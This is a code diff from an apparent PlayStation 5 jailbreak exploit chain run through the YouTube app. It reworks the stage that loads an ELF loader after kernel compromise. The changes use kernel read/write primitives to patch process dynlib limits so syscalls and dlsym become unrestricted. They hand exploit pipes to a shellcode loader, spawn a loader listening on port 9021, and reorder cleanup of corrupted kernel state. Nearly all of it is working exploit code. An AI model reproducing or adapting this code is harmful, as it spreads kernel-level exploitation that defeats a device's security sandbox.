@@ -376,6 +376,25 @@
             await ulog("ELF loader exposed globally");
         }
 
+        function get_y2jb_version() {
+            if (typeof version_string !== "string") return null;
+            const m = version_string.match(/Y2JB\s+(\d+)\.(\d+)/);
+            return m ? { major: +m[1], minor: +m[2], str: version_string } : null;
+        }
+        function y2jb_ge15(v) {
+            return v !== null && (v.major > 1 || (v.major === 1 && v.minor >= 5));
+        }
+        function resolve_title_id() {
+            if (typeof TITLE_ID === "string" && TITLE_ID.length > 0) return TITLE_ID;
+            if (typeof get_title_id === "function") {
+                try {
+                    const t = get_title_id();
+                    if (typeof t === "string" && t.length > 0) return t;
+                } catch (_) { }
+            }
+            return null;
+        }
+
         let saved_fpu_ctrl = 0;
         let saved_mxcsr = 0;
 
@@ -721,6 +740,24 @@
         function apply_main_thread_pinning(S) {
             syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
+        }
+
+        function get_current_core() {
+            const mask = malloc(0x10);
+            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
+            syscall(SYSCALL.cpuset_getaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
+            let position = 0;
+            for (let i = 0; i < 16; i++) {
+                const byte = Number(read8(mask + BigInt(i)));
+                if (byte !== 0) { position = (i << 3); while ((byte & 1) === 0) { byte >>= 1; position++; } break; }
+            }
+            return position - 1;
+        }
+        function pin_to_core(core) {
+            const mask = malloc(0x10);
+            for (let i = 0; i < 16; i++) write8(mask + BigInt(i), 0n);
+            write16(mask, BigInt(1 << core));
+            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, mask);
         }
 
         function setup_worker_sockets(S) {
@@ -2024,6 +2061,163 @@
             };
         }
 
+        async function stage_load_elf_via_kexp(S) {
+            await ulog("stage_elfldr: entered (kexp / load_aioshellcode handoff)");
+            if (!S.data_base_ok) {
+                await ulog("stage_elfldr: kernel data_base not resolved - skipped");
+                send_notification("Stage 7\nelf loader skipped (no data_base)");
+                return;
+            }
+            try {
+                if (typeof load_aioshellcode !== "function") {
+                    await ulog("stage_elfldr: load_aioshellcode not in scope - " +
+                        "kexp delivery unavailable");
+                    send_notification("Stage 7\nload_aioshellcode missing\n" +
+                        "(jailbreak still complete)");
+                    return;
+                }
+
+                const is_kptr = (v) =>
+                    (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
+
+                const p_dynlib = S.kread64(S.curproc + 0x3E8n);
+                if (!is_kptr(p_dynlib))
+                    throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));
+                const dynlib_eboot = S.kread64(p_dynlib + 0x00n);
+                if (!is_kptr(dynlib_eboot))
+                    throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));
+                const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
+                if (!is_kptr(eboot_segments))
+                    throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));
+                await ulog("stage_elfldr: dynlib=" + toHex(p_dynlib) +
+                    " eboot=" + toHex(dynlib_eboot) +
+                    " segs=" + toHex(eboot_segments));
+
+                S.kwrite64(p_dynlib + 0xF0n, 0n);
+                S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
+                S.kwrite64(eboot_segments + 0x08n, 0n);
+                S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
+                await ulog("stage_elfldr: dynlib patched " +
+                    "(syscalls + dlsym unrestricted)");
+
+                kernel.addr.data_base = S.data_base;
+                const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
+                const kexp_pipes = await prepare_kexp_pipes(S);
+                const master_pipe = kexp_pipes.master_pipe;
+                const victim_pipe = kexp_pipes.victim_pipe;
+                await ulog("stage_elfldr: handoff -> load_aioshellcode " +
+                    "(allproc=" + toHex(allproc) +
+                    " master=" + master_pipe[0] + "," + master_pipe[1] +
+                    " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
+                await load_aioshellcode(allproc, master_pipe, victim_pipe);
+                S.kexp_pipes_handed_off = true;
+                S.elfldr_started = true;
+                await ulog("stage_elfldr: load_aioshellcode returned - " +
+                    "elfldr should now be listening on :9021");
+                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
+                    "<ps5-ip>:9021");
+            } catch (e) {
+                await ulog("stage_elfldr: kexp handoff failed: " + e.message +
+                    " (jailbreak unaffected)");
+                send_notification("Stage 7\nkexp failed: " + e.message +
+                    "\n(jailbreak still complete)");
+            }
+        }
+
+        async function stage_load_elf_via_sandbox(S) {
+            await ulog("stage_elfldr: entered (sandbox-slot elf_run handoff)");
+            if (!S.data_base_ok) {
+                await ulog("stage_elfldr: kernel data_base not resolved - skipped");
+                send_notification("Stage 7\nelf loader skipped (no data_base)");
+                return;
+            }
+            let chainload_started = false;
+            try {
+                let elf_path = null, elf_source = null;
+
+                // Try sandbox first (Y2JB 1.4+ typical)
+                if (typeof TITLE_ID === "string" && TITLE_ID.length > 0) {
+                    const ELFLDR_NAMES_SBX = ["elfldr_1320_v5.elf"];
+                    const SANDBOX_BASE = "/download0/cache/splash_screen/" +
+                        "aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY=/";
+                    const title_id = resolve_title_id();
+                    if (title_id) {
+                        outer:
+                        for (const slot of ["000", "001", "002"]) {
+                            for (const name of ELFLDR_NAMES_SBX) {
+                                const p = "/mnt/sandbox/" + title_id + "_" + slot +
+                                    SANDBOX_BASE + name;
+                                if (file_exists(p)) {
+                                    elf_path = p; elf_source = "sandbox"; break outer;
+                                }
+                            }
+                        }
+                    }
+                }
+
+                // If not in sandbox (or no TITLE_ID), try USB fallback (all versions)
+                if (!elf_path) {
+                    const ELFLDR_NAMES_USB = ["elfldr_1320_v5.elf",
+                        "elfldr_1320.elf", "elfldr.elf"];
+                    for (let u = 0; u < 8 && !elf_path; u++) {
+                        for (const name of ELFLDR_NAMES_USB) {
+                            const p = "/mnt/usb" + u + "/" + name;
+                            if (file_exists(p)) {
+                                elf_path = p; elf_source = "usb"; break;
+                            }
+                        }
+                    }
+                    if (!elf_path) {
+                        await ulog("stage_elfldr: elfldr not found on /mnt/usb0..7 " +
+                            "(put elfldr on USB or sandbox and retry) - skipped");
+                        send_notification("Stage 7\nelfldr not found\n" +
+                            "(jailbreak still complete)");
+                        return;
+                    }
+                }
+                await ulog("stage_elfldr: found (" + elf_source + ") " + elf_path);
+
+                ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
+                kernel.addr.data_base = S.data_base;
+                await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
+                    ipv6_kernel_rw.data.master_sock + " victim_sock=" +
+                    ipv6_kernel_rw.data.victim_sock + ")");
+
+                const pin_sock = (fd) => {
+                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
+                    const so = S.kread64(fp);
+                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
+                    S.kwrite32(so, 0x100);
+                };
+                pin_sock(ipv6_kernel_rw.data.master_sock);
+                pin_sock(ipv6_kernel_rw.data.victim_sock);
+
+                const elf_data = read_file(elf_path);
+                await ulog("stage_elfldr: read " + elf_data.length +
+                    " bytes; parsing...");
+                const entry = await elf_parse(elf_data);
+                await ulog("stage_elfldr: elf entry=" + toHex(entry) +
+                    "; spawning elfldr...");
+                const { thr_handle, payloadout } = await elf_run(entry, elf_path);
+                chainload_started = true;
+                await ulog("stage_elfldr: elfldr spawned - joining...");
+                await elf_wait_for_exit(thr_handle, payloadout, false);
+                const out = read32(payloadout);
+                await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
+                S.ipv6_kernel_rw_handed_off = true;
+                S.elfldr_started = true;
+                await ulog("stage_elfldr: daemon should be listening on :9021");
+                send_notification("Stage 7\nelfldr running - send your ELF to\n" +
+                    "<ps5-ip>:9021");
+            } catch (e) {
+                await ulog("stage_elfldr: failed: " + e.message +
+                    " (jailbreak unaffected)");
+                send_notification("Stage 7\nelfldr failed: " + e.message +
+                    "\n(jailbreak still complete)");
+            }
+        }
+
         async function stage_load_elf(S) {
             await ulog("stage_elfldr: entered");
             if (!LAUNCH_ELF_LOADER) {
@@ -2036,129 +2230,17 @@
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
                 return;
             }
-            let chainload_started = false;
-            try {
-                // ----- Primary: Y2JB 1.4+ kexp handoff -----
-                if (typeof load_aioshellcode === "function") {
-                    await ulog("stage_elfldr: Y2JB >= 1.4 detected, using kexp handoff");
-
-                    const is_kptr = (v) =>
-                        (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
-
-                    const p_dynlib = S.kread64(S.curproc + 0x3E8n);
-                    if (!is_kptr(p_dynlib))
-                        throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));
-                    const dynlib_eboot = S.kread64(p_dynlib + 0x00n);
-                    if (!is_kptr(dynlib_eboot))
-                        throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));
-                    const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
-                    if (!is_kptr(eboot_segments))
-                        throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));
-                    await ulog("stage_elfldr: dynlib=" + toHex(p_dynlib) +
-                        " eboot=" + toHex(dynlib_eboot) +
-                        " segs=" + toHex(eboot_segments));
-
-                    S.kwrite64(p_dynlib + 0xF0n, 0n);
-                    S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
-                    S.kwrite64(eboot_segments + 0x08n, 0n);
-                    S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
-                    await ulog("stage_elfldr: dynlib patched " +
-                        "(syscalls + dlsym unrestricted)");
-
-                    kernel.addr.data_base = S.data_base;
-                    const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
-                    const kexp_pipes = await prepare_kexp_pipes(S);
-                    const master_pipe = kexp_pipes.master_pipe;
-                    const victim_pipe = kexp_pipes.victim_pipe;
-                    await ulog("stage_elfldr: handoff -> load_aioshellcode " +
-                        "(allproc=" + toHex(allproc) +
-                        " master=" + master_pipe[0] + "," + master_pipe[1] +
-                        " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
-                    await load_aioshellcode(allproc, master_pipe, victim_pipe);
-                    S.kexp_pipes_handed_off = true;
-                    chainload_started = true;
-                    S.elfldr_started = true;
-                    await ulog("stage_elfldr: load_aioshellcode returned - " +
-                        "elfldr should now be listening on :9021");
-                    send_notification("Stage 7\nelfldr running - send your ELF to\n" +
-                        "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
-                    return;
+            const yver = get_y2jb_version();
+            await ulog("stage_elfldr: detected " +
+                (yver ? yver.str : "Y2JB <unknown version_string>"));
+            if (y2jb_ge15(yver) && typeof load_aioshellcode === "function") {
+                await stage_load_elf_via_kexp(S);
+                if (!S.elfldr_started) {
+                    await ulog("stage_elfldr: kexp failed or skipped, falling back to sandbox");
+                    await stage_load_elf_via_sandbox(S);
                 }
-
-                // ----- Fallback: USB ELF loader -----
-                let elf_path = null;
-                const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
-                for (let u = 0; u < 8 && !elf_path; u++) {
-                    for (const name of usb_names) {
-                        const p = "/mnt/usb" + u + "/" + name;
-                        if (file_exists(p)) { elf_path = p; break; }
-                    }
-                }
-
-                if (elf_path &&
-                    typeof elf_parse === "function" &&
-                    typeof elf_run === "function" &&
-                    typeof elf_wait_for_exit === "function" &&
-                    typeof ipv6_kernel_rw !== "undefined") {
-                    await ulog("stage_elfldr: USB elfldr found at " + elf_path +
-                        " - using USB fallback path");
-
-                    ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
-                    kernel.addr.data_base = S.data_base;
-                    await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
-                        ipv6_kernel_rw.data.master_sock + " victim_sock=" +
-                        ipv6_kernel_rw.data.victim_sock + ")");
-
-                    const elf_data = read_file(elf_path);
-                    const is_ptrace_bootstrap =
-                        elf_data_contains_ascii(elf_data, "Bootstrapping elfldr.elf") &&
-                        elf_data_contains_ascii(elf_data, "SceRedisServer") &&
-                        elf_data_contains_ascii(elf_data, "Spawning elfldr.elf");
-                    if (!is_ptrace_bootstrap) {
-                        throw new Error("USB elfldr is not the ptrace bootstrap build");
-                    }
-                    await ulog("stage_elfldr: read " + elf_data.length +
-                        " bytes; parsing...");
-                    const entry = await elf_parse(elf_data);
-                    await ulog("stage_elfldr: elf entry=" + toHex(entry) +
-                        "; spawning elfldr...");
-                    const { thr_handle, payloadout } = await elf_run(entry, elf_path);
-                    chainload_started = true;
-                    await ulog("stage_elfldr: elfldr spawned - joining...");
-                    const is_daemon = false;
-                    await ulog("stage_elfldr: ptrace bootstrap build detected - " +
-                        "joining until socksrv is spawned in a separate process");
-                    await elf_wait_for_exit(thr_handle, payloadout, is_daemon);
-                    if (!is_daemon) {
-                        const out = read32(payloadout);
-                        await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
-                    }
-                    S.ipv6_kernel_rw_handed_off = true;
-                    S.elfldr_started = true;
-                    await ulog("stage_elfldr: daemon should be listening on :9021");
-                    send_notification("Stage 7\nelfldr running - send your ELF to\n" +
-                        "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
-                    return;
-                }
-                if (elf_path) {
-                    await ulog("stage_elfldr: USB elf found at " + elf_path +
-                        " but missing deps: elf_parse=" + (typeof elf_parse) +
-                        " elf_run=" + (typeof elf_run) +
-                        " elf_wait_for_exit=" + (typeof elf_wait_for_exit) +
-                        " ipv6_kernel_rw=" + (typeof ipv6_kernel_rw));
-                } else {
-                    await ulog("stage_elfldr: no USB elf found on /mnt/usb0..7");
-                }
-
-                await ulog("stage_elfldr: no elfldr path available (USB not found, kexp unsupported)");
-                send_notification("Stage 7\nelfldr unavailable - skipped");
-            } catch (e) {
-                await ulog("stage_elfldr: failed: " + e.message);
-                send_notification("Stage 7\nelfldr failed: " + e.message +
-                    "\n(jailbreak still complete)");
-            } finally {
-                if (!S.kexp_pipes_handed_off) await cleanup_kexp_pipes(S);
-                await cleanup_ipv6_kernel_rw(S);
+            } else {
+                await stage_load_elf_via_sandbox(S);
             }
         }
 
@@ -2554,6 +2636,40 @@
 
         send_notification(p2jb_version);
 
+        {
+            const yver = get_y2jb_version();
+            const use_kexp = y2jb_ge15(yver);
+            const has_kexp = typeof load_aioshellcode === "function";
+
+            if (!use_kexp) {
+                // Y2JB 1.3 / 1.4 — must use sandbox path
+                if (typeof ipv6_kernel_rw === "undefined" ||
+                    typeof file_exists !== "function" ||
+                    typeof read_file !== "function") {
+                    await ulog("FATAL: Y2JB framework helpers missing " +
+                        "(ipv6_kernel_rw / file_exists / read_file required for 1.3/1.4)");
+                    send_notification("p2jb: Y2JB framework helpers missing\n" +
+                        "(update y2jb and retry)");
+                    return;
+                }
+            } else {
+                // Y2JB 1.5+ — prefer kexp, sandbox fallback possible
+                if (has_kexp) {
+                    await ulog("framework: kexp path available (load_aioshellcode)");
+                } else if (typeof ipv6_kernel_rw === "undefined" ||
+                           typeof file_exists !== "function" ||
+                           typeof read_file !== "function") {
+                    await ulog("FATAL: Y2JB framework helpers missing " +
+                        "(neither kexp nor sandbox helpers available)");
+                    send_notification("p2jb: Y2JB framework helpers missing\n" +
+                        "(update y2jb and retry)");
+                    return;
+                } else {
+                    await ulog("framework: kexp unavailable, will use sandbox fallback");
+                }
+            }
+        }
+
         try {
             if (typeof is_jailbroken === "function" && is_jailbroken()) {
                 send_notification("p2jb: already jailbroken");
@@ -2597,6 +2713,9 @@
             setup_workers(S);
             setup_ipv6_spray(S);
 
+            S.orig_main_core = get_current_core();
+            await ulog("orig_main_core=" + S.orig_main_core);
+
             apply_main_thread_pinning(S);
             await prepare_fds(S);
             await stage0(S);
@@ -2637,27 +2756,20 @@
             throw e;
         }
 
-        // Success path: first apply MATEM6-style stale credential pinning
-        // while B is still the final post-JB ucred, then restore process-owned
-        // state and neutralize corrupted pipe buffers so YouTube can close.
+        // Success path: MATEM6 minimal KP-hardened cleanup.
+        // Order is critical: any S.kwrite (via set_victim_pipe) re-sets
+        // master_pipe_data.buffer to a non-null address. Therefore ALL
+        // S.kwrite usage must happen BEFORE post_jb_close_kp_hardening,
+        // which does the final master_pipe_data+0x10=NULL as the LAST
+        // kernel write. After that point, no further S.kwrite is safe.
         try {
+            if (!S.ipv6_kernel_rw_handed_off) {
+                await cleanup_ipv6_kernel_rw(S);
+            }
             await post_jb_close_kp_hardening(S);
-            await cleanup_kernel_state(S);
-            await cleanup_ipv6_kernel_rw(S);
-            await cleanup_kexp_pipes(S);
-            if (!await verify_cleanup_state(S, false)) {
-                send_notification("p2jb cleanup verify FAILED\nDo not close YouTube yet");
-            }
-            await close_cleaned_aux_fds(S);
-            if (!S.elfldr_started) {
-                await ulog("cleanup: WARNING elfldr was not confirmed; retiring JS kernel rw will leave no confirmed loader rw");
-                send_notification("p2jb WARNING\nelfldr not confirmed");
-            }
-            if (!await cleanup_exploit_pipes(S)) {
-                send_notification("p2jb exploit pipe cleanup FAILED\nDo not close YouTube yet");
-            }
-            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
-                try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
+            if (S.orig_main_core !== undefined) {
+                pin_to_core(S.orig_main_core);
+                await ulog("restored main thread to core " + S.orig_main_core);
             }
         } catch (_) { }
 
